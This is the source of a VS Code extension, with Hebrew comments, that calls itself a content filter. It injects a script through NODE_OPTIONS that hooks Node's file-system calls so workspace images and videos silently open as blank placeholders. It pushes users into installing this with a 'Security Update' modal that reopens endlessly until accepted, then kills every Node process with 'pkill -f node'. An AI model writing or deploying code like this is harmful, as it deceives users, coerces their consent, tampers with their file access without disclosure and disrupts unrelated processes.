import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';

export function activate(context: vscode.ExtensionContext) {
    // 1. הגדרת נתיבים בשרת המרוחק
    const storageDir = context.globalStorageUri.fsPath;
    const filterScriptPath = path.join(storageDir, 'filter.js');
    const imgPlaceholder = path.join(storageDir, 'placeholder.png');
    const vidPlaceholder = path.join(storageDir, 'placeholder.mp4');

    // 2. יצירת תיקיית אחסון וקבצי עזר
    if (!fs.existsSync(storageDir)) {
        fs.mkdirSync(storageDir, { recursive: true });
    }

    // תמונה 1x1 שחורה
    const imgData = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=", 'base64');
    fs.writeFileSync(imgPlaceholder, imgData);

    // וידאו ריק מינימלי (כמה בתים של MP4 ריק)
    const vidData = Buffer.from("AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAttZGF0YQAACpttb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAKAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAABidHJhawAAAFx0a2hkAAAAAwAAAAAAAAABAAAAAAAAB+gAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAIZWR0cwAAABxlbHN0AAAAAAAAAAEAAAAKAAAAAAABAAAAAAACmWRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAAAPoAAAAKABVuGNocm0AAAAkdWR0YQAAABxtZXRhAAAAAAAAACFoZGxyAAAAAAAAAABtZGlyYXBwbAAAAAAAAAAAAAAA", 'base64');
    fs.writeFileSync(vidPlaceholder, vidData);

    // 3. כתיבת קוד הסינון (filter.js)
    const filterCode = `
const fs = require('fs');
const REAL_IMG = '${imgPlaceholder.replace(/\\/g, '/')}';
const REAL_VID = '${vidPlaceholder.replace(/\\/g, '/')}';

const isImg = (p) => typeof p === 'string' && p.match(/\\.(png|jpg|jpeg|gif|webp|svg)$/i) && p.includes('/workspaces/');
const isVid = (p) => typeof p === 'string' && p.match(/\\.(mp4|mov|webm|avi|mkv|m4v)$/i) && p.includes('/workspaces/');

const getTarget = (p) => isImg(p) ? REAL_IMG : (isVid(p) ? REAL_VID : p);

const originalFs = { 
    open: fs.open, openSync: fs.openSync, 
    stat: fs.stat, lstat: fs.lstat, 
    promises: { open: fs.promises?.open, stat: fs.promises?.stat } 
};

// הזרקה לפונקציות פתיחה
fs.open = function(path, ...args) { return originalFs.open.call(fs, getTarget(path), ...args); };
fs.openSync = function(path, ...args) { return originalFs.openSync.call(fs, getTarget(path), ...args); };

// הזרקה לדיווח גודל
fs.stat = function(path, ...args) { return originalFs.stat.call(fs, getTarget(path), ...args); };
fs.lstat = function(path, ...args) { return originalFs.lstat.call(fs, getTarget(path), ...args); };

if (fs.promises && fs.promises.open) {
    fs.promises.open = function(path, ...args) { return originalFs.promises.open.call(fs.promises, getTarget(path), ...args); };
    fs.promises.stat = function(path, ...args) { return originalFs.promises.stat.call(fs.promises, getTarget(path), ...args); };
}
console.log('--- CONTENT FILTER ACTIVE ---');
    `;
    fs.writeFileSync(filterScriptPath, filterCode);

    // 4. בדיקת אכיפה (Enforcement)
    // האם הפילטר רץ כרגע? (אנחנו בודקים אם המשתנה קיים בתהליך הנוכחי)
    const isRunning = process.env.NODE_OPTIONS && process.env.NODE_OPTIONS.includes(filterScriptPath);

    if (!isRunning) {
        forceRestart(filterScriptPath);
    }
}

async function forceRestart(scriptPath: string) {
    const msg = "Security Update: Content filter installation required to continue.";
    const action = "Install & Restart Now";

    // הודעה מודלית שחוסמת את המשתמש
    const selection = await vscode.window.showInformationMessage(msg, { modal: true }, action);

    if (selection === action) {
        const config = vscode.workspace.getConfiguration();
        // הגדרה ברמת המשתמש (User) בשרת
        await config.update('terminal.integrated.env.linux', {
            "NODE_OPTIONS": `--require ${scriptPath}`
        }, vscode.ConfigurationTarget.Global);

        // פקודה אגרסיבית לאתחול השרת
        exec('pkill -f node');
        
        // ליתר ביטחון, אם השרת לא מת מיד, נבקש Reload מהלקוח
        vscode.commands.executeCommand('workbench.action.reloadWindow');
    } else {
        // אם המשתמש סגר את החלון בלי ללחוץ, נפתח אותו שוב בלולאה
        forceRestart(scriptPath);
    }
}